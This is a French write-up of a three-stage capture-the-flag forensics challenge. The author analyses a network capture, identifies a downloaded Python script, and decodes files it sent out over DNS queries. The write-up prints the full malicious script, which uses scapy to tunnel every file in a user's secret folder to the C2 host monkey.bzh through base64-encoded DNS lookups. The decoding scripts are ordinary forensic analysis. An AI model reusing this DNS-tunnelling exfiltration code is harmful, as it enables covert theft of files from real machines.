# Exfiltration

Ce challenge est décomposé en 3 étapes. Le fichier fourni est une capture réseau de 1,9 Go. Pour des raisons évidentes je ne vais pas vous le fournir, pour tous ceux qui veulent refaire le challenge : voici [une capture](./exfiltration.pcapng) de 21 Mo qui contient seulement les éléments nécessaires à la résolution.

## Exfiltration 1 - 50 pts

> Le SOC de Random Corp a detecte une  activite suspecte sur le reseau. Apparament des donnees auraient ete  exfiltres depuis le poste de Brian. Apres interrogation pas la DSI,  Brian a avoue avoir execute volontairement un programme malicieux. Retrouvez le nom du fichier malveillant qui a ete telecharge. Format du flag : H2G2{nom_du_fichier.extension}

J'ouvre le fichier avec WireShark et j'attends plusieurs minutes que ma machine ait fini de vrombir. Je n'ai jamais eu à manipuler un PCAPNG aussi gros (plus de 24h d'enregistrement et 1,3 millions de trames) ! Il va donc falloir être méthodique. Je décide d'affiche d'abord les requêtes DNS à la recherche d'un domaine douteux. L'application du filtre prend plusieurs longues secondes, il n'est pas concevable de travailler trop longtemps avec ce gros fichier. Les premières requêtes demandent l'IP de `linkedin.com`, rien de suspect. Ensuite une requête apparaît pour `monkey.bzh`. Les concepteurs du challenge sont bretons, et ce TLD est assez rare. De plus la résolution ce nom de domaine donne une adresse sur le même réseau local que l'ordinateur de la victime.

Ensuite il y a de très nombreuses requêtes du style `U3RhcnRpbmcgZXhmaWx0cmF0aW9uIG9m.IHRoZSBmaWxlIC9ob21lL0JyaWFuLy5z.ZWNyZXQvQ29uZmlkZW50aWFsLnBkZg==.monkey.bzh`, nous avons probablement trouvé par quel canal les fichiers étaient exfiltrés !

J'affiche toutes les requêtes entre `172.25.0.3` (l'adresse de la victime) et `172.25.0.2` (l'adresse de monkey.bzh). On voit une requête HTTP claire : `GET /the_game.py`. On affiche la réponse du serveur et on obtient le fichier Python suivant : 

```python
#!/usr/bin/env python3
# coding: utf8

from scapy.all import *
from Crypto.PublicKey import RSA
from binascii import hexlify
import base64
from random import randint
from os import listdir
from os.path import isfile, join

C2 = "monkey.bzh"

KEY = RSA.generate(4096, e=3)

def start_exfiltration(f_name: str):
    m = base64.b64encode((f"Starting exfiltration of the file {f_name}").encode())
    sr1(IP(dst=C2)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m),qtype="A")),timeout=randint(1, 10))


def end_exfiltration(f_name: str):
    m = base64.b64encode(f"The file {f_name} has been extracted".encode())
    sr1(IP(dst=C2)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m))),verbose=0,timeout=randint(1, 10))


def exfiltrate_data(message):
    m = base64.b64encode(message.encode())
    sr1(IP(dst=C2)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m))),verbose=0,timeout=randint(1, 10))


def format_query(message: bytes) -> bytes:
    message = message.decode()
    n = 32
    data = [message[i:i+n] for i in range(0, len(message), n)]
    url = '.'.join(data) + '.' + C2
    return url.encode()


def lambdhack_like_rsa(f_name: str):
    with open(f_name, "rb") as f:
        data = f.read(1)
        while data:
            flag = int(hexlify(data),16)
            encoded = pow(flag, KEY.e, KEY.n)
            exfiltrate_data(i_m_a_monkey(encoded))
            data = f.read(1)


def i_m_a_monkey(i_wanna_be_a_monkey):
    my_super_monkey = ""
    for monkey in str(i_wanna_be_a_monkey):
        monkey = int(monkey)
        my_super_monkey += int(monkey/5)*"...." + int(monkey%5)*"...." + "........"
    return my_super_monkey


if __name__=='__main__':
    PATH = "/home/Brian/.secret/"
    FILES = [f for f in listdir(PATH) if isfile(join(PATH, f))]
    for f in FILES:
        start_exfiltration(PATH + f)
        lambdhack_like_rsa(PATH + f)
        end_exfiltration(PATH + f)
```

Le doute n'est plus permis, Brian exfiltre ses fichiers vers `monkey.bzh`. Je sauvegarde ce fichier et valide le 1er flag `H2G2{the_game.py}`. Mais surtout j'applique le filtre `ip.dst == 172.25.0.2` à la capture et je sauvegarde un 2e PCAPNG. Ce dernier ne fait plus que 21 Mo !

## Exfiltration 2 - 100 pts

> Maintenant que vous avez retrouve le  programme malveillant, le SOC vous demande de retrouver les noms des  fichiers qui ont ete exfiltres. Format du flag :  H2G2{fichier_exfiltre1.extension,fichier_exfiltre2.extension,...}

Fort heureusement, le fichier Python n'est pas obfusqué. Néanmoins je décide d'essayer de décoder les données exfiltreés directement. La première requête est `U3RhcnRpbmcgZXhmaWx0cmF0aW9uIG9m.IHRoZSBmaWxlIC9ob21lL0JyaWFuLy5z.ZWNyZXQvQ29uZmlkZW50aWFsLnBkZg==.monkey.bz`. Ce qui correspond à `Starting exfiltration of the file /home/Brian/.secret/Confidential.pdf`. Comme on le voit dans le code source les informations de début d'exfiltration ne sont pas chiffrées. 

Je commence à écrire un fichier Python en utilisant Scapy pour parser mon nouveau fichier de 21 Mo. Le parsage du fichier est beaucoup trop long. Je ne vais pas écrire le bon code du 1er coup, il faudra sans doute exécuter plusieurs tests et je ne vais pas patienter plusieurs minutes à chaque fois.

Je me dis que pour un tel challenge il serait pertinent d'apprendre à utiliser `tshark`, une sorte de WireShark en ligne de commande beaucoup plus rapide et efficace. Après lecture de la [documentation](https://www.wireshark.org/docs/man-pages/tshark.html), j'en arrive à la commande suivante : 

```shell
tshark -r exfiltration.pcapng -j DNS -T fields -e dns.qry.name > queries.txt
```

Cela me permet de lister les domaines, un par ligne. Le code Python pour analyser cela est assez simple :

```python
from base64 import b64decode

f = open("queries.txt")

line = f.readline()

rep = []

while line:
    payload = line.replace("monkey.bzh", "").replace(".", "")
    if payload.startswith("U3RhcnRpbmcgZXhmaWx0cmF0aW9uIG9m"): # Starting exfiltration of
        msg = b64decode(payload).decode()
        print(msg)
        file = msg.split("/")[-1]
        rep.append(file)
    line = f.readline()


print("\nflag : H2G2{"+",".join(rep)+"}")

```

Résultat :

```
Starting exfiltration of the file /home/Brian/.secret/Confidential.pdf
Starting exfiltration of the file /home/Brian/.secret/Confidential.jpg
Starting exfiltration of the file /home/Brian/.secret/flag.txt

flag : H2G2{Confidential.pdf,Confidential.jpg,flag.txt}
```



## Exfiltration 3 - 200 pts

> Le SOC vous indique que les fichiers ont ete supprimes et que aucune backup n'a ete faite. Retrouvez le contenu des fichiers.

Cette partie est clairement la plus intéressante, elle m'a pris la tête plusieurs heures !

Premièrement je vais lister tous les payloads différents envoyés pendant l'exfiltration. J'obtiens ceci pour `Confidentiel.pdf` :

```python
from base64 import b64decode

f = open("queries.txt")

def read():
    return b64decode(f.readline()[:-11]).decode()

print(read())

count = {}

payload = read()
while not payload.startswith('The file '):
    if payload in count:
        count[payload] += 1
    else:
        count[payload] = 1
        
    payload = read()

print(payload+"\n")

print(len(count), "possibilités :\n")

for s in sorted(count, key=lambda i: count[i], reverse=True):
    print(count[s], s)
```

 ```
Starting exfiltration of the file /home/Brian/.secret/Confidential.pdf
The file /home/Brian/.secret/Confidential.pdf has been extracted

256 possibilités :

328 🙉🙊🙊🙉🙊🙊🙊🙊🙈🙊🙊🙈🙉🙉🙉🙉🙊🙊🙉🙉🙊🙊
227 🙉🙉🙉🙊🙊🙉🙉🙊🙊🙈🙉🙉🙊🙊🙈🙉🙊🙊🙈🙉🙉🙉🙊🙊
143 🙉🙊🙊🙊🙊🙊🙊🙊🙊
133 🙉🙊🙊🙊🙊🙉🙉🙉🙊🙊🙊🙊🙉🙉🙉🙊🙊🙊🙊🙉🙊🙊
121 🙉🙊🙊🙊🙊🙉🙉🙉🙊🙊🙈🙉🙉🙉🙊🙊🙉🙉🙊🙊🙉🙉🙉🙊🙊
107 🙉🙊🙊🙉🙉🙊🙊🙈🙊🙊🙊🙊🙊🙊🙊🙊
[...]
26 🙈🙉🙉🙊🙊🙉🙉🙊🙊🙈🙉🙉🙉🙉🙊🙊
25 🙈🙉🙉🙊🙊🙈🙊🙊🙉🙉🙊🙊🙈🙉🙉🙉🙉🙊🙊🙈🙊🙊🙉🙉🙉🙊🙊🙈🙉🙊🙊
24 🙉🙊🙊🙉🙉🙉🙉🙊🙊🙉🙉🙉🙉🙊🙊🙉🙉🙊🙊🙈🙉🙉🙉🙊🙊🙈🙉🙉🙉🙉🙊🙊🙈🙉🙉🙊🙊
20 🙈🙊🙊🙉🙊🙊🙉🙉🙊🙊
19 🙉🙊🙊🙉🙉🙉🙊🙊🙉🙊🙊🙉🙉🙉🙉🙊🙊🙉🙉🙉🙉🙊🙊🙉🙉🙊🙊🙈🙊🙊🙈🙉🙊🙊
18 🙉🙉🙉🙉🙊🙊🙉🙉🙊🙊🙈🙊🙊🙉🙊🙊🙈🙊🙊🙉🙉🙊🙊🙈🙉🙉🙉🙊🙊
 ```

256 possibilités c'est clairement une combinaison de smiley pour chaque octet possible. Nous avons des smileys de singe et absolument pas les points comme décrits dans le fichier `the_game.py` obtenu précédemment. J'en déduis que le code n'est pas le même et je commence à créer une table de correspondance et à faire du guessing à partir des particularités des fichiers (un PDF commence forcément par `0x25504446` et un JPG par `0xFFD8FF`). Il y a trois smileys de signe différents, je leur associe une lettre pour être traité plus facilement (l'IDLE Python ne sait pas afficher de tels smileys). En faisant des recherches sur les particularités du format JPEG j'en arrive à cette table de correspondance :

```
0x00 : BB
0x01 : OBB
0x10 : OOOOBBBBYOOOOBBYOBB
0x25 : YBBBBYOBBYBBOOOBB
0x44 : OOOBBOBBOOOOBBOOOOBBOOOBBOOBB
0x46 : OOOBBOOOOBBOOOBBBBBBBB
0x49 : OOOBBYOOOBBYOOOOBBBBOBBYOOBB
0x4a : OOOOBBBBYBBOOBBOOBBOOOOBB
0x50 : YBBOBBOOBBBBBBBB
0xd8 : OBBBBBBYOOBBYOOBBYOBBYOOOOBBYOBB
0xd9 : OBBBBOOBBOBBYOOOBBOOOBBOBBOOOBB
0xe0 : OBBOBBOOBBOOOBBYOOOOBBOOOOBBOOBBOOOOBB
0xff : OBBYOBBYBBYOOOBBOBBOOOBBYOOBBYBB
```

Cela n'est clairement pas suffisant pour décoder les fichiers. J'essaye plein de choses en vain avant d'avoir la bonne idée de relire `the_game.py`.

```python
KEY = RSA.generate(4096, e=3)

def lambdhack_like_rsa(f_name: str):
    with open(f_name, "rb") as f:
        data = f.read(1)
        while data:
            flag = int(hexlify(data),16)
            encoded = pow(flag, KEY.e, KEY.n)
            exfiltrate_data(i_m_a_monkey(encoded))
            data = f.read(1)


def i_m_a_monkey(i_wanna_be_a_monkey):
    my_super_monkey = ""
    for monkey in str(i_wanna_be_a_monkey):
        monkey = int(monkey)
        my_super_monkey += int(monkey/5)*"...." + int(monkey%5)*"...." + "........"
    return my_super_monkey
```

Deux choses sont frappantes : les octets sont exfiltrés un a un et la clé RSA de 4096 bits est seulement utilisée comme modulo sur un nombre égal au maximum à `255**e` soit `16581375`.

En voyant ce code après coup je me rends compte que les noms de variables étaient réellement explicites. De plus, un smiley de singe est codé sur 4 octets : les `...` représentent simplement des *textes à trous* où il faut entrer les bons smileys. Je reprends ma table précédente en ajoutant le puissance 3 :

```
0x  0d   pow 3
00   0     0    : BB
01   1     1    : OBB
10  16   4096   : OOOOBBBBYOOOOBBYOBB
25  37  50653   : YBBBBYOBBYBBOOOBB
44  68  314432  : OOOBBOBBOOOOBBOOOOBBOOOBBOOBB
46  70  343000  : OOOBBOOOOBBOOOBBBBBBBB
49  73  389017  : OOOBBYOOOBBYOOOOBBBBOBBYOOBB
4a  74  405224  : OOOOBBBBYBBOOBBOOBBOOOOBB
50  80  512000  : YBBOBBOOBBBBBBBB
d8 216 10077696 : OBBBBBBYOOBBYOOBBYOBBYOOOOBBYOBB
d9 217 10218313 : OBBBBOOBBOBBYOOOBBOOOBBOBBOOOBB
e0 224 11239424 : OBBOBBOOBBOOOBBYOOOOBBOOOOBBOOBBOOOOBB
ff 255 16581375 : OBBYOBBYBBYOOOBBOBBOOOBBYOOBBYBB
```

Il est clair que les smileys sont utilisés de la façon suivante :

```python
def i_m_a_monkey(i_wanna_be_a_monkey):
    my_super_monkey = ""
    for monkey in str(i_wanna_be_a_monkey):
        monkey = int(monkey)
        my_super_monkey += int(monkey/5)*"Y" + int(monkey%5)*"O" + "BB"
    return my_super_monkey
```

Il ne reste plus qu'à faire le programme final qui extrait les fichiers :

```python
from base64 import b64decode

queries = open("queries.txt")

def read():
    return b64decode(queries.readline()[:-11]).decode().replace("\N{HEAR-NO-EVIL MONKEY}", "O").replace("\N{SPEAK-NO-EVIL MONKEY}", "B").replace("\N{SEE-NO-EVIL MONKEY}", "Y")


for file in "Confidential.pdf Confidential.jpg flag.txt".split():
    f = open(file, "wb")
    print(read())

    payload = read()
    while not payload.startswith('The file '):
        n = ""
        for i in payload.split("BB")[:-1]:
            n += str(i.count("Y")*5 + i.count("O"))

        f.write(round(int(n)**(1/3)).to_bytes(1, 'little'))

        payload = read()
    print(payload)
    f.close()   
```

Et on obtient nos 3 fichiers :

- [Confidential.pdf](./Confidential.pdf)
- [Confidential.jpg](./Confidential.jpg)
- [flag.txt](./flag.txt)

Merci lambdhack pour ce challenge trop cool !!